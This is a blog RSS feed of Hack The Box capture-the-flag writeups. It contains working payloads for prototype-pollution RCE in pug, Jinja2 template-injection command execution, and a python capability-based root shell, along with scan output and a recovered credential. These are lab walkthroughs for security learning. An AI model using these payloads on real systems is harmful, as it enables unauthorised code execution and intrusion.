<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Harshit Maheshwari</title>
        <link>https://harshitm98.github.io/posts/</link>
        <description>Recent content in Posts on Harshit Maheshwari</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Mon, 27 Dec 2021 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://harshitm98.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>HTB Gunship - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-challenge-gunship/</link>
            <pubDate>Mon, 27 Dec 2021 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-challenge-gunship/</guid>
            <description>Access details -&amp;gt; 159.65.31.1:32618
We are provided with a website which has only one input field and we have the source code available.
So let&amp;rsquo;s go through the source code which is made available to us.
Quick Recon  Packages installed (package.json)  &amp;#34;dependencies&amp;#34;: { &amp;#34;express&amp;#34;: &amp;#34;^4.17.1&amp;#34;, &amp;#34;flat&amp;#34;: &amp;#34;5.0.0&amp;#34;, &amp;#34;pug&amp;#34;: &amp;#34;^3.0.0&amp;#34; }  We have pug:3.0.0 which is vulnerable to RCE. Source: https://github.com/pugjs/pug/issues/3312    Location of vulnerability (routes/index.js)  const pug = require(&amp;#39;pug&amp;#39;); .</description>
            <content type="html"><![CDATA[<p>Access details -&gt; 159.65.31.1:32618</p>
<p>We are provided with a website which has only one input field and we have the source code available.</p>
<p>So let&rsquo;s go through the source code which is made available to us.</p>
<h3 id="quick-recon">Quick Recon</h3>
<ul>
<li>Packages installed (<code>package.json</code>)</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">		<span style="color:#e6db74">&#34;dependencies&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {
			<span style="color:#f92672">&#34;express&#34;</span>: <span style="color:#e6db74">&#34;^4.17.1&#34;</span>,
			<span style="color:#f92672">&#34;flat&#34;</span>: <span style="color:#e6db74">&#34;5.0.0&#34;</span>,
			<span style="color:#f92672">&#34;pug&#34;</span>: <span style="color:#e6db74">&#34;^3.0.0&#34;</span>
		}
</code></pre></div><ul>
<li>We have <code>pug:3.0.0</code> which is vulnerable to RCE.</li>
<li>Source: <a href="https://github.com/pugjs/pug/issues/3312">https://github.com/pugjs/pug/issues/3312</a></li>
</ul>
<hr>
<ul>
<li>Location of vulnerability (<code>routes/index.js</code>)</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pug</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;pug&#39;</span>);

	...
	<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/api/submit&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
	    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">artist</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">unflatten</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
	
		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Haigh&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Westaway&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Gingell&#39;</span>)) {
			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
				<span style="color:#e6db74">&#39;response&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">pug</span>.<span style="color:#a6e22e">compile</span>(<span style="color:#e6db74">&#39;span Hello #{user}, thank you for letting us know!&#39;</span>)({ <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;guest&#39;</span> })
			});
		} <span style="color:#66d9ef">else</span> {
			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
				<span style="color:#e6db74">&#39;response&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Please provide us with the full name of an existing member.&#39;</span>
			});
		}
	});
</code></pre></div><ul>
<li>Request submitted through <code>/api/submit</code> where body of the request(<code>req.body</code>) is passed to <code>unflatten</code>.</li>
<li>So we can pass our payload through the body and when it is unflattened, we can prolly get RCE.</li>
</ul>
<h3 id="exploiting-the-bug">Exploiting the bug</h3>
<ul>
<li>We navigate to <code>/</code> (http://159.65.31.1:32618/) and then enter some random values, intercept the request in Burp.</li>
<li>Modify the request of the body so it looks like:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTTP" data-lang="HTTP"><span style="color:#a6e22e">POST</span> /api/submit <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">159.65.31.1:32618</span>
Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">170</span>
User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36</span>
Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://159.65.31.1:32309</span>
Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://159.65.31.1:32309/</span>
Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-GB,en-US;q=0.9,en;q=0.8</span>
Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>

{
	<span style="color:#f92672">&#34;artist.name&#34;</span>:<span style="color:#e6db74">&#34;Haigh&#34;</span>,<span style="color:#f92672">&#34;__proto__.block&#34;</span>: {
	<span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;Text&#34;</span>, 
	<span style="color:#f92672">&#34;line&#34;</span>: <span style="color:#e6db74">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;$(ls | grep flag)&#39;)&#34;</span>
	}
}
</code></pre></div><ul>
<li>Output:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">pre</span>&gt;Error: Command failed: $(ls | grep flag)&lt;<span style="color:#f92672">br</span>&gt;/bin/sh: flagQLGyS: not found&lt;<span style="color:#f92672">br</span>&gt; on line 1&lt;<span style="color:#f92672">br</span>&gt;
</code></pre></div><p><em>Note: We are running <code>$(ls |  grep flag)</code> instead of <code>ls | grep flag</code> because when the command executes without any error, we cannot see the output</em></p>
<ul>
<li>Now let&rsquo;s <code>cat</code> the file
<ul>
<li>Reques bodyt:</li>
</ul>
</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">		{
			<span style="color:#f92672">&#34;artist.name&#34;</span>:<span style="color:#e6db74">&#34;Haigh&#34;</span>,<span style="color:#f92672">&#34;__proto__.block&#34;</span>: {
	        <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;Text&#34;</span>, 
	        <span style="color:#f92672">&#34;line&#34;</span>: <span style="color:#e6db74">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;$(cat flagQLGyS)&#39;)&#34;</span>
		    }
		}
</code></pre></div><pre><code>- Output:
</code></pre>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">	&lt;<span style="color:#f92672">pre</span>&gt;Error: Command failed: $(cat flagQLGyS)&lt;<span style="color:#f92672">br</span>&gt;/bin/sh: HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}: not found
	&lt;<span style="color:#f92672">br</span>&gt; on line 1&lt;<span style="color:#f92672">br</span>&gt;
</code></pre></div><p>References:</p>
<ul>
<li>(Peak resource) <a href="https://blog.p6.is/AST-Injection/">https://blog.p6.is/AST-Injection/</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>HTB Templated - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-challenge-templated/</link>
            <pubDate>Sun, 26 Dec 2021 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-challenge-templated/</guid>
            <description>Navigating through the website Requested: GET /invalid -&amp;gt; we got invalid
Verifying if SSTI is possible Requested: GET /invalid{{7*7}} -&amp;gt; we got invalid49 instead of invalid{{7*7}}
We know that it is Jinja2 and Flask, so we can use their payload.
Getting the flag Requested: GET /{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat%20flag.txt&#39;).read()}} -&amp;gt; we got the flag
Alternative Finding subprocess.Popen index.
 GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&amp;gt; Popen is there in the list  GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[300:] -&amp;gt; Popen is there in the list GET /{{&#39;&#39;.</description>
            <content type="html"><![CDATA[<h2 id="navigating-through-the-website">Navigating through the website</h2>
<p>Requested: <code>GET /invalid</code> -&gt; we got <code>invalid</code></p>
<p><img src="/img/templated/Pasted%20image%2020211226121920.png" alt=""></p>
<h2 id="verifying-if-ssti-is-possible">Verifying if SSTI is possible</h2>
<p>Requested: <code>GET /invalid{{7*7}}</code> -&gt; we got <code>invalid49</code> instead of <code>invalid{{7*7}}</code></p>
<p><img src="/img/templated/Pasted%20image%2020211226121844.png" alt=""></p>
<p>We know that it is Jinja2 and Flask, so we can use their payload.</p>
<h2 id="getting-the-flag">Getting the flag</h2>
<p>Requested: <code>GET /{{config.__class__.__init__.__globals__['os'].popen('cat%20flag.txt').read()}}</code> -&gt; we got the flag</p>
<p><img src="/img/templated/Pasted%20image%2020211226182358.png" alt=""></p>
<h3 id="alternative">Alternative</h3>
<p><strong>Finding <code>subprocess.Popen</code> index.</strong></p>
<ol>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[100:]</code> -&gt; Popen is there in the list
<img src="/img/templated/Pasted%20image%2020211226184612.png" alt=""></li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[300:]</code> -&gt; Popen is there in the list</li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[500:]</code> -&gt; Internal Server Error</li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[400:]</code> -&gt; Popen is there in the list</li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[450:]</code> -&gt; Popen is NOT there in the list</li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[414]</code> -&gt; Popen exists</li>
</ol>
<p><code>GET /{{''.__class__.mro()[1].__subclasses__()[414]('cat%20flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}</code></p>
<p>References:</p>
<ul>
<li><a href="https://blog.nvisium.com/p263">https://blog.nvisium.com/p263</a></li>
<li><a href="https://blog.nvisium.com/p255">https://blog.nvisium.com/p255</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>HTB Cap - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-machine-cap/</link>
            <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-machine-cap/</guid>
            <description>Enumeration Nmap Scans Service Scan # Nmap 7.91 scan initiated Fri Jul 16 20:44:02 2021 as: nmap -T4 -A -p21,22,80 -oA nmap/service-scan -Pn 10.10.10.245 Nmap scan report for 10.10.10.245 Host is up (0.068s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Fri, 16 Jul 2021 15:14:15 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | &amp;lt;!</description>
            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
<h2 id="nmap-scans">Nmap Scans</h2>
<h3 id="service-scan">Service Scan</h3>
<pre><code># Nmap 7.91 scan initiated Fri Jul 16 20:44:02 2021 as: nmap -T4 -A -p21,22,80 -oA nmap/service-scan -Pn 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Fri, 16 Jul 2021 15:14:15 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
|     &lt;title&gt;404 Not Found&lt;/title&gt;
|     &lt;h1&gt;Not Found&lt;/h1&gt;
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 16 Jul 2021 15:14:09 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     &lt;!DOCTYPE html&gt;
|     &lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&gt;
|     &lt;head&gt;
|     &lt;meta charset=&quot;utf-8&quot;&gt;
|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;
|     &lt;title&gt;Security Dashboard&lt;/title&gt;
|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&gt;
|     &lt;!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 16 Jul 2021 15:14:09 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;title&gt;Bad Request&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;
|     &lt;/body&gt;
|_    &lt;/html&gt;
|_http-server-header: gunicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=7/16%Time=60F1A242%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,2FE5,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
SF:Fri,\x2016\x20Jul\x202021\x2015:14:09\x20GMT\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
SF:86\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;en\&quot;&gt;\
SF:n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x2
SF:0&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\
SF:x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\
SF:x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=
SF:1\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;shortcut\x20icon\&quot;\x20type=\&quot;image
SF:/png\&quot;\x20href=\&quot;/static/images/icon/favicon\.ico\&quot;&gt;\n\x20\x20\x20\x20&lt;
SF:link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/bootstrap\.min\.css\&quot;&gt;
SF:\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/fon
SF:t-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20
SF:href=\&quot;/static/css/themify-icons\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=
SF:\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/metisMenu\.css\&quot;&gt;\n\x20\x20\x20\x2
SF:0&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/owl\.carousel\.min\.
SF:css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/c
SF:ss/slicknav\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&quot;)%r(HTTPOption
SF:s,B3,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Fri,\x2
SF:016\x20Jul\x202021\x2015:14:09\x20GMT\r\nConnection:\x20close\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x
SF:20GET\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
SF:/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20
SF:\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\
SF:n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invali
SF:d\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTSP
SF:/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(FourOhFourRequest,189
SF:,&quot;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20F
SF:ri,\x2016\x20Jul\x202021\x2015:14:15\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
SF:r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x203\.2\x20
SF:Final//EN\&quot;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;
SF:\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&quot;);
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 16 20:47:13 2021 -- 1 IP address (1 host up) scanned in 190.95 seconds
</code></pre><ul>
<li>Port 21, 80 open</li>
</ul>
<h2 id="enumeration-port-80">Enumeration: Port 80</h2>
<ul>
<li>gunicorn</li>
</ul>
<h3 id="ip"><code>/ip</code></h3>
<p>Runs <code>ifconfig</code> on the machine</p>
<p><img src="/img/cap/Pasted_image_20210716205953.png" alt="/img/cap/Pasted_image_20210716205953.png"></p>
<h3 id="netstat"><code>/netstat</code></h3>
<p>Runs <code>netstat</code> on the machine</p>
<h3 id="capture"><code>/capture</code></h3>
<p>Captures PCAP packets of the server and made available for download</p>
<h3 id="ffuf-scan">ffuf scan</h3>
<pre><code>$ ffuf -u &lt;http://10.10.10.245/FUZZ&gt; -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -r -v -c -ic -of html -o http/http-80-medium-no-ext.html

         /'___\\  /'___\\           /'___\\
        /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
          \\/_/    \\/_/   \\/___/    \\/_/

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : &lt;http://10.10.10.245/FUZZ&gt;
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Output file      : http/http-80-medium-no-ext.html
 :: File format      : html
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | &lt;http://10.10.10.245/&gt;
    * FUZZ:

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | &lt;http://10.10.10.245/data&gt;
    * FUZZ: data

[Status: 200, Size: 17445, Words: 7275, Lines: 355]
| URL | &lt;http://10.10.10.245/ip&gt;
    * FUZZ: ip

[Status: 200, Size: 72923, Words: 36727, Lines: 768]
| URL | &lt;http://10.10.10.245/netstat&gt;
    * FUZZ: netstat

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | &lt;http://10.10.10.245/capture&gt;
    * FUZZ: capture

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | &lt;http://10.10.10.245/&gt;
    * FUZZ:

:: Progress: [207630/207630] :: Job [1/1] :: 633 req/sec :: Duration: [0:05:37] :: Errors: 0 ::

</code></pre><pre><code>/
/data
/ip
/capture
/netstat

</code></pre><ul>
<li>
<p>The packets captured on <code>/capture</code> are available as <code>/data/1</code> and so forth. The number starts from 1.</p>
</li>
<li>
<p>Opening <code>/data/0</code> being packet not captured by us. Might find something juicy.</p>
</li>
<li>
<p>Downloading it and opening in wireshark</p>
<p><img src="/img/cap/Pasted_image_20210717190239.png" alt="/img/cap/Pasted_image_20210717190239.png"></p>
<p><img src="/img/cap/Pasted_image_20210717190340.png" alt="/img/cap/Pasted_image_20210717190340.png"></p>
</li>
</ul>
<p>We get FTP id and password</p>
<pre><code>nathan:Buck3tH4TF0RM3!
</code></pre><h1 id="exploitation">Exploitation</h1>
<h2 id="getting-shell">Getting shell</h2>
<p>Using these credentials to login in using SSH, we get a shell</p>
<p><img src="/img/cap/Pasted_image_20210717190453.png" alt="/img/cap/Pasted_image_20210717190453.png"></p>
<h1 id="post-exploit-enumeration---user-level">Post Exploit Enumeration - User level</h1>
<p><img src="/img/cap/Pasted_image_20210721202213.png" alt="/img/cap/Pasted_image_20210721202213.png"></p>
<p>Linux Capabilities: <em>Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.</em></p>
<p>Further Reading → <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities</a></p>
<h1 id="exploitation-1">Exploitation</h1>
<pre><code>python3.8 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;);'
</code></pre><p><img src="/img/cap/Pasted_image_20210722000148.png" alt="/img/cap/Pasted_image_20210722000148.png"></p>
<p><img src="/img/cap/Pasted_image_20210722000201.png" alt="/img/cap/Pasted_image_20210722000201.png"></p>
]]></content>
        </item>
        
        <item>
            <title>HTB Spectra - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-machine-spectra/</link>
            <pubDate>Sun, 18 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-machine-spectra/</guid>
            <description>Enumeration Nmap Scans Service Scan # Nmap 7.91 scan initiated Fri Jun 11 23:59:16 2021 as: nmap -T4 -A -p22,80,3306 -oA nmap/service-scan -Pn 10.10.10.229 Nmap scan report for 10.10.10.229 Host is up (0.068s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn&#39;t have a title (text/html). 3306/tcp open mysql? |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) Service detection performed.</description>
            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
<h2 id="nmap-scans">Nmap Scans</h2>
<h3 id="service-scan">Service Scan</h3>
<pre><code># Nmap 7.91 scan initiated Fri Jun 11 23:59:16 2021 as: nmap -T4 -A -p22,80,3306 -oA nmap/service-scan -Pn 10.10.10.229
Nmap scan report for 10.10.10.229
Host is up (0.068s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql?
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
# Nmap done at Sat Jun 12 00:01:05 2021 -- 1 IP address (1 host up) scanned in 109.31 seconds

</code></pre><p><strong>Summary</strong></p>
<ul>
<li>Ports opened -&gt; 22, 80, 3306</li>
</ul>
<h2 id="enumeration-port-80">Enumeration: Port 80</h2>
<p>Landing page:</p>
<p><img src="/img/spectra/Pasted_image_20210612000503.png" alt="/img/spectra/Pasted_image_20210612000503.png"></p>
<p>Source code:</p>
<p><img src="/img/spectra/Pasted_image_20210612000522.png" alt="/img/spectra/Pasted_image_20210612000522.png"></p>
<p>This uses <code>http://spectra.htb/</code> instead of the IP, so we modify in our <code>/etc/hosts</code> file as well</p>
<pre><code>$ cat /etc/hosts | grep spectra.htb
10.10.10.229    spectra.htb
</code></pre><h3 id="main">/main</h3>
<p>Landing page</p>
<p><img src="/img/spectra/Pasted_image_20210612000654.png" alt="/img/spectra/Pasted_image_20210612000654.png"></p>
<p>It&rsquo;s a wordpress site.</p>
<ul>
<li>wpscan does not reveal anything interesting.</li>
</ul>
<h3 id="testing">/testing</h3>
<ul>
<li>Error establishing database connection</li>
</ul>
<p>Running ffuf</p>
